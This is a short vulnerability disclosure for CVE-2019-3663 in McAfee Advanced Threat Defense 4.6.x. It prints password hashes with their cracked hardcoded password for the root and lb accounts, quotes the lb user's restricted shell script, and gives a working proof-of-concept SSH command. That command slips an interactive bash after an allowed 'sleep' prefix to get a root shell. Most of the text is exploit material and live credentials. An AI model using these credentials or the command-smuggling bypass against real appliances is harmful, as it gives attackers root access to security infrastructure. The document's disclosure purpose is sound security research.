# McAfee ATD CVE-2019-3663
* McAfee Advanced Threat Defense ATD 4.6.x and earlier - Hardcoded root password
* Security Bulletin: https://kc.mcafee.com/corporate/index?page=content&id=SB10304

## Interesting shadow entries
```
root:$6$hHb7yjP/$JY9Zf8jFCL966X8rbOqerkuXR86AUMl4bNCuDiEgoXWZEE5dWssWvnokv.54YG4/KRQuNbZBiUWur2/Tj4uUf0:18030:0:99999:7:::
lb:$6$.ewB2mx1KaJArlbX$Bk8y21qhRblgJrlPW68712YqlS/kII6iVxLw849NK/6PAVYLHto1btfL4s.2WVpMNh1tXIwzr/h
```

## Interesting passwd entries
```
root:x:0:0:root:/root:/sbin/nologin
lb:x:0:0::/home/lb:/opt/amas/bin/lb_shell
```

## Cracked hashes
```
$6$hHb7yjP/$JY9Zf8jFCL966X8rbOqerkuXR86AUMl4bNCuDiEgoXWZEE5dWssWvnokv.54YG4/KRQuNbZBiUWur2/Tj4uUf0:validedge
$6$.ewB2mx1KaJArlbX$Bk8y21qhRblgJrlPW68712YqlS/kII6iVxLw849NK/6PAVYLHto1btfL4s.2WVpMNh1tXIwzr/h4WIY60R1xe.:validedge
```

## Custom shell of 'lb' user
```
$ cat /opt/amas/bin/lb_shell
#!/bin/bash
# We accept exactly 2 args and in the form:
# -c <command>
if (( $# != 2 )) || [[ "$1" != "-c" ]] ; then
  echo interactive login not permitted
  exit 1
fi
case "$2" in
  # Accept only scp and fileupload commands
  "scp "* | "php /srv/www/htdocs/php/fileupload.php "* | "mv /vedata/"* | "cd /srv/www/htdocs/php/"* | "sleep"* | *"collectPerformanceData.sh "*)
  ;; # continue execution
   * )
   echo that command is not allowed
   exit 1
   ;;
esac
# Execute the command
/bin/bash -c "$2"
# Return with the exit status of the command
exit $?
```

# PoC
```
$ ssh -p 2222 lb@b.b.c.d "sleep 1;/bin/bash -i "
[root@mcafee ~]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@mcafee ~]#
```
